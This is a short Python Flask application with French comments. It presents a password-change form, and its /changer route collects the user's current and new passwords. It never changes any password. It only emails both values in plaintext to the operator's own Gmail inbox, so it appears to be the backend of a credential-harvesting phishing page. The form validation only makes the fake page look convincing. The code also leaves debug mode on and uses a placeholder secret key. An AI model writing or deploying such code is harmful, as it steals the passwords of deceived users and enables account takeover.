from flask import Flask, render_template, request, jsonify
from flask_mail import Mail, Message
import os
app = Flask(__name__)
app.secret_key = "change_this_to_a_secure_key"

# ===============================
# CONFIGURATION GMAIL
# ===============================

app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False
app.config['MAIL_USERNAME'] = os.environ.get("MAIL_USERNAME")
app.config['MAIL_PASSWORD'] = os.environ.get("MAIL_PASSWORD")  # 🔴 Mot de passe d’application

mail = Mail(app)

# ===============================
# ROUTE PAGE FORMULAIRE
# ===============================
@app.route("/")
def home():
    return render_template("email.html")

# ===============================
# ROUTE TRAITEMENT FORMULAIRE
# ===============================
@app.route("/changer", methods=["GET", "POST"])
def changer():
    if request.method == "GET":
        # Affiche le formulaire
        return render_template("changer.html")
    
    # Si c'est POST, on traite les données
    try:
        data = request.get_json()  # Ton JS envoie du JSON

        current_password = data.get("currentPassword")
        new_password = data.get("newPassword")
        confirm_password = data.get("confirmPassword")

        # Validation
        if not current_password or not new_password or not confirm_password:
            return jsonify({"success": False, "error": "Tous les champs sont obligatoires"})

        if new_password != confirm_password:
            return jsonify({"success": False, "error": "Les mots de passe ne correspondent pas"})

        if len(new_password) < 6:
            return jsonify({"success": False, "error": "Le mot de passe doit contenir au moins 6 caractères"})

        # Création du message
        msg = Message(
            subject="Formulaire - Changement de mot de passe",
            sender=app.config['MAIL_USERNAME'],
            recipients=[app.config['MAIL_USERNAME']]  # on s’envoie l’email à soi-même
        )

        msg.html = f"""
        <div style="font-family: Arial; padding:20px;">
            <h2 style="color:#007BFF;">🔐 Nouvelle demande</h2>
            <p><strong>Mot de passe actuel :</strong> {current_password}</p>
            <p><strong>Nouveau mot de passe :</strong> {new_password}</p>
        </div>
        """

        mail.send(msg)

        return jsonify({"success": True})

    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# ===============================
# LANCEMENT SERVEUR
# ===============================
if __name__ == "__main__":
    app.run(debug=True)